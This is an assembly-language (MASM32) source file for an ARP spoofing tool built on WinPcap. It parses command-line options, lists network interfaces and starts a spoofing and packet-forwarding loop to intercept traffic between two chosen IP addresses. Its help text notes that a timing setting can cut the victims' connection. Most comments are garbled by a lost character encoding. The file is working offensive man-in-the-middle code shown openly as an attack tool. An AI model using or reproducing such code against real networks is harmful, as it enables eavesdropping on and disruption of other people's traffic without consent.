; ������ � �������� �  
; C:\Program Files\WinPcap ���������� WinPcap_4_1_2.exe
; � ����� http://www.winpcap.org/  
;
; ���� � ���������� �� 
; http://www.winpcap.org/docs/docs_41/html/group__wpcapfunc.html
.386
.model 		flat,stdcall
option 		casemap:none
include		\masm32\include\windows.inc
include		\masm32\include\kernel32.inc
include		\masm32\include\masm32.inc
include		\masm32\include\user32.inc
include		\masm32\include\wsock32.inc
include		\masm32\include\msvcrt.inc
include		\masm32\include\IpHlpApi.inc

; wpcap.inc, packet.inc, wpcap.lib, packet.lib - http://www.asmfr.com//code.aspx?ID=48163
include		..\packet\packet.inc
include		..\wpcap\wpcap.inc

; Stdlib.inc, Stdlib.lib, Stdlib.mac - "COPYRIGHT (C) BY DRIZZ http://drizz.has.it/"
; getseg.inc, getseg.lib - "GetSeg Library by Digital Monkey 
;				http://www.wasm.ru/baixado.php?mode=src&id=178"
include		..\Stdlib\Stdlib.inc	
include		..\getseg\getseg.inc
	
include		..\Stdlib\Stdlib.mac

includelib	\masm32\lib\kernel32.lib
includelib	\masm32\lib\masm32.lib
includelib	\masm32\lib\user32.lib
includelib	\masm32\lib\wsock32.lib
includelib	\masm32\lib\msvcrt.lib
includelib	\masm32\lib\IpHlpApi.lib

includelib	..\packet\packet.lib
includelib	..\wpcap\wpcap.lib
 
includelib	..\Stdlib\Stdlib.lib
includelib	..\getseg\getseg.lib

; ������� ��������� "�������" ������� �� ���������� msvcrt
memset		proto c:DWORD, :DWORD, :DWORD 
memcpy		proto c:DWORD, :DWORD, :DWORD 
memcmp		proto c:DWORD, :DWORD, :DWORD 
strcmp		proto c:DWORD, :DWORD
atoi		proto c:DWORD
malloc		proto c:DWORD
free		proto c:DWORD

param_i		proto :DWORD 	; ������� ��������� ���������  "-i"
InitARPSpoof	proto
StartARPSpoof	proto
GetLocalIP	proto :DWORD
GetLocalMAC	proto :DWORD, :DWORD
SpoofThread	proto :DWORD
SpoofInfo		proto :DWORD
SendingARP	proto :DWORD
ResetSpoof	proto
CtrlHandler	proto :DWORD
pcap_loop		proto :DWORD, :DWORD, :DWORD, :DWORD
packet_handler	proto :DWORD, :ptr pcap_pkthdr, :ptr byte
ForwardPacket	proto :DWORD, :ptr byte, :DWORD

show_error	proto :DWORD 	; �������������� ����� ������
show_help		proto		; ����� ������ ����. �� ������������� �����
StaticARP		proto :DWORD, :DWORD; �������	��������� ���������� ARP - ������������
GetMAC		proto :DWORD, :DWORD; �������	���������� MAC ������ �� IP ������ ����� 
Print_MAC		proto :DWORD

.const
	OID_802_3_PERMANENT_ADDRESS	equ 1010101h
	OID_802_3_CURRENT_ADDRESS	equ 1010102h
.data
align 4
	ARPSPOOF	struct 
		ucSelfMAC		db 6 dup(0)	; self MAC
		szTarget		db 16 dup(0)	; target IP Address
		ucTargetMAC	db 6 dup(0)	; target MAC
		szIP		db 16 dup(0)	; IP2's IP
		ucIPMAC		db 6 dup(0)	; IP2's TRUE MAC used to restor local arp cache
		ucPretendMAC	db 6 dup(0)	; IP2's Pretend MAC
		hInterface	dd 0
		szSelfIP		db 16 dup(0)	; mySelf IP
	ARPSPOOF	ends

	arpspoof	ARPSPOOF <>	

	PACKET_OID_DATA struct
		Oid	DWORD 0
		Lengthz	DWORD 0
		Dataz	BYTE 256 dup( 0 ) 
	PACKET_OID_DATA ends

	commstr			db '> ',0		; ������ ����������� ������ � ��������
	szformat 			db '%hS',0	; ������  
	szformatNb		db '%d',0		; ������  
	szformatNb1		db ' param = %d',13,10,0; ������  
	szformatMAC		db '%.02X:%.02X:%.02X:%.02X:%.02X:%.02X',0 ; ������ ��� MAC ������ 
	ParOpen			db ' [',0
	ParClose			db '] ',0

	szhelper	db ' Usage: arpspoof [-h] -i [[N] [-t M] [-s IP_A IP_B ]]',13,10,\
		'	-h - show help',13,10,\
		'	-i - output list of interfaces',13,10,0
	szhelper1	db	'	 N - number of intresting interface',13,10,\
		'	-s IP_A IP_B - listen to the traffic from A up to B and back',13,10,\
		'	-t M - whis M msec of waiting of sending answer',13,10,\
		'	   (if set M>= 250 its will be a down of connection)',13,10,0

	szerror_i			db 'param -i',13,10,0 ; ������ ��������� "-i"
	szerror_s			db 'param -s',13,10,0 ; ������ ��������� "-s"
	szerror_t			db 'param -t',13,10,0 ; ������ ��������� "-t"
	szerror_template		db '[-] Error in %s',0 ; ������ ������ ���������� 
	szparam_s			db '-s ',0
	szErrOpenDev 		db 'Unable to open the adapter.',0
	crlf			db 13,10,0
	szErrpcap_findalldevs 	db '[-] Error in pcap_findalldevs',0
	DevSelection		dd 0
	DevCounter		dd 0
	compteur			dd 0

	errbuf			db [PCAP_ERRBUF_SIZE] dup (0)
	buff			db [MAX_PATH] 	dup (0)

	dwTimeWait		dd 0


	hThread1			dd 0
	hThread2			dd 0
	dwCode1			dd 0
	dwCode2			dd 0

	pMemory			dd 0
	pMemory2			dd 0
.data?
; ������������� ����������
	adhandle			pcap_t	<?>
	alldevs 			pcap_if_t	<?>

;-------------------------------------------------------------------
; ����� ����� ���������� inc - � ������� ���������� � ������� �� ��������� ))
include		functs.inc
include		params.inc

;-------------------------------------------------------------------
.code
;===================================================================
;===================================================================
;===================================================================
; ������� start
;
start:
; �������� �������� ��������� ������� ����������� ��� ������ 
	invoke	pcap_findalldevs,addr alldevs,addr errbuf
	.if (eax == -1)
		invoke	StdOut, addr szErrpcap_findalldevs							
	.endif

	assume	ecx:ptr pcap_if
	mov	ecx,alldevs
	mov	DevCounter,1
	; ���������� DevCounter ������� ����� ��������� ������� �����������
	@@:
	push	ecx
	.if	([ecx].next)
		invoke	StdOut, addr crlf
		pop	ecx
		mov	ecx,[ecx].next
		inc	DevCounter
		jmp	@B
	.else
		pop	ecx
	.endif  

	; ������ ������ ���. ������
	invoke	ParamStr, 1, addr buff, 128	; ������� "-i"
	lea	edi, buff
	;---------------------------------------------------------------
	cmp	word ptr[edi], 'h-'	; ������������ ������ "-h". 
	jne	@F
	invoke	show_help		;������� ��� ���������� �� ������������� ������.						
	jmp	__Exit	
	;---------------------------------------------------------------
@@:	lea	edi, buff
	cmp	word ptr[edi], 'i-'	; ������������ ������ "-i". 
	je	@F
	invoke	show_error,addr szerror_i	;Ec�� ������ �������� �� "-i" - �� ����� ��������.
					; �� ���� �� ����� �������� � ������� ������� ����������� )	 
	jmp	__Exit	
	;---------------------------------------------------------------
@@:	invoke	ParamCount	; � eax - ���������� ���������� ���. ������
	xor	ecx,ecx	
	mov	compteur,eax	; �������� �� � [compteur]
	.while	ecx !=compteur	; ����������� ��� �� ��� ��� ���� ��� �� ������ ����� [compteur]
		inc	ecx
		push	ecx

		invoke	ParamStr, ecx, addr buff, MAX_PATH	; ������� � buff ���. ������
		lea	edi, buff
		;---------------------------------------------------------------
		cmp	word ptr[edi], 'i-'	; ������������ ������ "-i"? 
		jne	@F
					; ������� "N" -����� ���������� � ������� ����� ��������
		invoke	ParamStr, ecx, addr buff, MAX_PATH
		invoke	atoi, addr buff	
		.if	eax != 0
			.if	eax <= DevCounter	; ���� ������������ ���� �� ������ ����� ���������� 
						; ������ ��� ��� �������� �� ���� ������, 
						; �� ���������� ��� ����� ������
				mov	DevSelection, eax	; �������� ����� ���������� ���������� 
							; � ���������� "DevSelection"
				invoke	param_i, eax	; �������� � ���������� "-i N"
			.else
				; ������� �����. �� ������ � ��������� "-i" 
				invoke	show_error,addr szerror_i 
				jmp	__Exit	
			.endif
			jmp	__next
		.else
			invoke	param_i, 0	; ���� ������������ �� ���� 
						; ����� ������������� ����������, �� ������� ��� 
						; �������� ���� �����������, ����� �������.
			.break
		.endif
		;---------------------------------------------------------------
	@@:	cmp	word ptr[edi], 't-'	; ������������ ������ "-t". 
		jne	@F
		pop	ecx		; ������� "M" - �������� �������� � �������.
		inc	ecx		; ��� ����������� ��������� �������� ������
		push	ecx		; ����� �������

		invoke	ParamStr, ecx, addr buff, MAX_PATH	; ������� "N" -���������� ���������� 
							; ��� ������� ������ 
		invoke    atoi, addr buff
		.if	eax !=0
			invoke	atodw, addr buff		; ����������� ����� "M" � ����� 
			mov	dword ptr [dwTimeWait], eax	; ������� ��� ����� � ���������� [dwTimeWait]
			jne	__next
		.else
			mov	dword ptr [dwTimeWait], -1	; ����� �������� � ��� -1 ������� ���� 
							; ��� �������� �� �����
			jne	__next
		.endif

		;---------------------------------------------------------------

	@@:	cmp	word ptr[edi], 's-'	; ������������ ������ "-s". 
		jne	__next
		pop	ecx
		inc	ecx
		push	ecx

		assume	esi:ptr ARPSPOOF
		lea	esi,arpspoof
		invoke	ParamStr, ecx, addr buff, MAX_PATH	; ��������� 1-� �������� ��������� "-s".
							; ��� ������ ���� IP - ����� ����������� ������.
							; �������� ��� � [buff]

		.if	ecx == 0			; ���� ��� ��� �� ������� ��������� �� ������ � ��������� "-s".
			invoke	show_error,addr szerror_s 
			jmp	__Exit
		.else
			invoke	inet_addr,addr buff	; �������� ���������� IP - ������ � ���� ��� ��, 
						; �� �������� ��� � ������� ��������� ���������. 
			.if	eax==INADDR_NONE
				; ���� IP-����� �������, �� ������� ��������� �� ������ � ��������� "-s".  
				invoke	show_error,addr szerror_s	
			.else
				lea	eax,[esi].szIP
				invoke	lstrcpyn, eax, addr buff,16
			.endif
		.endif
		pop	ecx
		inc	ecx
		push	ecx
		invoke	ParamStr, ecx, addr buff, MAX_PATH	; ��������� 2-� �������� ��������� "-s".
							; ��� ������ ���� IP - ����� ���������� ������.
							; �������� ��� � [buff1]
		.if	ecx == 0			; ���� ��� ��� �� ������� ��������� �� ������ � ��������� "-s".
			invoke	show_error,addr szerror_s
			jmp	__Exit
		.else
			invoke	inet_addr, addr buff	; �������� ���������� IP - ������ � ���� ��� ��, 
						; �� �������� ��� � ������� ��������� ���������. 
			.if	eax==INADDR_NONE
				invoke	show_error,addr szerror_s	; ���� IP-����� �������, �� ������� 
			.else
				lea	eax,[esi].szTarget
				invoke	lstrcpyn, eax, addr buff,16	; ��������� �� ������ � ��������� "-s".  
			.endif
		.endif
		;---------------
		invoke	SetConsoleCtrlHandler, addr CtrlHandler, TRUE
		invoke	InitARPSpoof
		.if	eax !=0
			;	; �������� ���������
			jmp	__Exit
		.endif				
			
		invoke	StartARPSpoof
		.if	eax !=0
			;	; �������� ���������
			jmp	__Exit
		.endif

		lea	esi,arpspoof
		invoke	pcap_loop, adhandle, 0, offset packet_handler, NULL
		jmp	__Exit
		;---------------------------------------------------------------
	__next:	pop	ecx
	.endw
__Exit:	invoke	pcap_freealldevs,alldevs
	add	esp, 4*1
	invoke	ExitProcess,0
;===================================================================
;===================================================================
;===================================================================
end start	